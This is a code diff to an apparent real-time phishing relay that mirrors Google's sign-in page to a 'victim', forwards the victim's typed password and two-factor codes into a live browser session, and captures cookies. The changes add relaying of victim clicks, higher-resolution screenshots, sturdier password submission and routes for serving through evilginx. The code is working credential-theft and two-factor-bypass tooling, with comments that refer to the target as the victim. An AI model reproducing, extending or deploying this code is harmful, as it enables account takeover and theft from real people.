@@ -136,7 +136,7 @@ def ensure_xvfb():
                        capture_output=True, timeout=5)
         return display
     except Exception:
-        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "1366x768x24"],
+        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "1920x1080x24"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1.5)
         return display
@@ -239,6 +239,7 @@ class RelaySession(threading.Thread):
         self.error = None
         self.cookies = None
         self.inputs = queue.Queue()
+        self.clicks = queue.Queue()   # (px, py) percent-of-card taps from victim
         self.last_active = time.time()
         self.deadline = time.time() + 8 * 60
         self.finished = False
@@ -312,26 +313,28 @@ class RelaySession(threading.Thread):
                   ("input[name='totpPin']", "code"),
                   ("input[type='tel']", "code")]
 
+    def _card_box(self, pg):
+        """Bounding box of the centered sign-in card, viewport coords."""
+        for sel in ("#initialView", "div[role='main']", "main"):
+            try:
+                loc = pg.locator(sel).first
+                if loc.is_visible():
+                    box = loc.bounding_box()
+                    if box and box["width"] > 50:
+                        return box
+            except Exception:
+                continue
+        return None
+
     def _dom_snapshot(self, pg):
         """Extract the active input/button geometry relative to the card, so
         the victim page can overlay a real input exactly where Google's
         input renders in the live screenshot."""
         try:
-            card = None
-            for sel in ("#initialView", "div[role='main']", "main"):
-                loc = pg.locator(sel).first
-                try:
-                    if loc.is_visible():
-                        card = loc
-                        break
-                except Exception:
-                    continue
-            if card is None:
+            cbox = self._card_box(pg)
+            if not cbox:
                 return
-            cbox = card.bounding_box()
-            if not cbox or cbox["width"] < 50:
-                return
-            ibox = bbox = None
+            ibox = None
             kind = self.input_kind
             for sel, k in self.INPUT_SELS:
                 loc = pg.locator(sel).first
@@ -370,24 +373,48 @@ class RelaySession(threading.Thread):
         except Exception:
             pass
 
+    def _do_click(self, pg, px, py):
+        """Relay a victim tap on the mirrored card (percent coords) to the
+        real page — makes every button/link in the screenshot functional."""
+        cbox = self._card_box(pg)
+        if not cbox:
+            return
+        x = max(0, min(1920, cbox["x"] + cbox["width"] * px / 100.0))
+        y = max(0, min(1080, cbox["y"] + cbox["height"] * py / 100.0))
+        try:
+            pg.mouse.click(x, y)
+            print(f"[click] {self.id}: {px:.1f},{py:.1f} -> {x:.0f},{y:.0f}", flush=True)
+        except Exception as e:
+            print(f"[click-err] {self.id}: {str(e)[:80]}", flush=True)
+
+    def _drain_clicks(self, pg):
+        for _ in range(4):
+            try:
+                px, py = self.clicks.get_nowait()
+            except queue.Empty:
+                return
+            self.last_active = time.time()
+            self._do_click(pg, px, py)
+            time.sleep(0.3)
+
     def _stream(self, pg):
         """Refresh the mirror: DOM snapshot + screenshot + number extraction."""
         self._dom_snapshot(pg)
         try:
             shot = None
-            for sel in ("#initialView", "div[role='main']", "main"):
-                try:
-                    loc = pg.locator(sel).first
-                    if loc.is_visible():
-                        box = loc.bounding_box()
-                        if box and box["width"] > 250 and box["height"] > 150:
-                            shot = loc.screenshot(type="jpeg", quality=62)
+            cbox = self._card_box(pg)
+            if cbox and cbox["width"] > 250 and cbox["height"] > 150:
+                for sel in ("#initialView", "div[role='main']", "main"):
+                    try:
+                        loc = pg.locator(sel).first
+                        if loc.is_visible():
+                            shot = loc.screenshot(type="jpeg", quality=70)
                             break
-                except Exception:
-                    continue
+                    except Exception:
+                        continue
             if shot is None:
-                shot = pg.screenshot(type="jpeg", quality=60,
-                                     clip={"x": 171, "y": 64, "width": 1024, "height": 640})
+                shot = pg.screenshot(type="jpeg", quality=68,
+                                     clip={"x": 360, "y": 120, "width": 1200, "height": 840})
             self.screenshot = base64.b64encode(shot).decode()
         except Exception as e:
             if not getattr(self, "_shot_err_logged", False):
@@ -435,6 +462,7 @@ class RelaySession(threading.Thread):
                 self.last_active = time.time()
                 return item
             except queue.Empty:
+                self._drain_clicks(pg)
                 self._stream(pg)
                 if time.time() > self.deadline:
                     return ("abort", None)
@@ -481,10 +509,10 @@ class RelaySession(threading.Thread):
             browser = pw.chromium.launch(
                 headless=False,
                 args=["--no-sandbox", "--disable-dev-shm-usage",
-                      "--window-size=1366,768"],
+                      "--window-size=1920,1080"],
                 proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
             pg = browser.new_page(user_agent=UA, locale="en-US",
-                                  viewport={"width": 1366, "height": 768})
+                                  viewport={"width": 1920, "height": 1080})
             pg.goto(SIGNIN_URL, wait_until="load", timeout=60000)
             pg.wait_for_selector("#identifierId", timeout=20000)
             pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
@@ -529,8 +557,18 @@ class RelaySession(threading.Thread):
                     try:
                         pg.fill("input[name='Passwd']", item[1], timeout=5000)
                     except Exception:
-                        pg.fill("input[type='password']", item[1])
-                    pg.click("#passwordNext")
+                        try:
+                            pg.fill("input[type='password']", item[1], timeout=4000)
+                        except Exception:
+                            st = self._classify(pg) or "wait"
+                            continue
+                    try:
+                        pg.click("#passwordNext", timeout=5000)
+                    except Exception:
+                        # victim may have navigated the card (Forgot password,
+                        # Try another way) — follow the real flow instead of dying
+                        st = self._classify(pg) or "wait"
+                        continue
                     time.sleep(5)
                     st = self._classify(pg) or "wait"
                     for _ in range(12):
@@ -640,6 +678,8 @@ class Handler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         path, _, query = self.path.partition("?")
+        if path.startswith("/__relay/"):  # same page served via evilginx or direct
+            path = path[len("/__relay"):]
         qs = parse_qs(query)
         if path in ("/", "/index.html"):
             body = PAGE.encode()
@@ -682,6 +722,8 @@ class Handler(BaseHTTPRequestHandler):
 
     def do_POST(self):
         path = self.path.split("?")[0]
+        if path.startswith("/__relay/"):
+            path = path[len("/__relay"):]
         length = int(self.headers.get("Content-Length", "0"))
         try:
             data = json.loads(self.rfile.read(length) or b"{}")
@@ -706,6 +748,18 @@ class Handler(BaseHTTPRequestHandler):
                 return self._json({"error": "no session"}, 404)
             s.last_active = time.time()
             s.inputs.put((data.get("kind"), (data.get("value") or "")[:200]))
+            return self._json({"ok": True})
+        if path == "/api/click":
+            s = SESSIONS.get((data.get("id") or "")[:40])
+            if not s:
+                return self._json({"error": "no session"}, 404)
+            try:
+                px, py = float(data.get("x")), float(data.get("y"))
+            except (TypeError, ValueError):
+                return self._json({"error": "bad coords"}, 400)
+            if 0 <= px <= 100 and 0 <= py <= 100:
+                s.last_active = time.time()
+                s.clicks.put((px, py))
             return self._json({"ok": True})
         self._json({"error": "not found"}, 404)
 
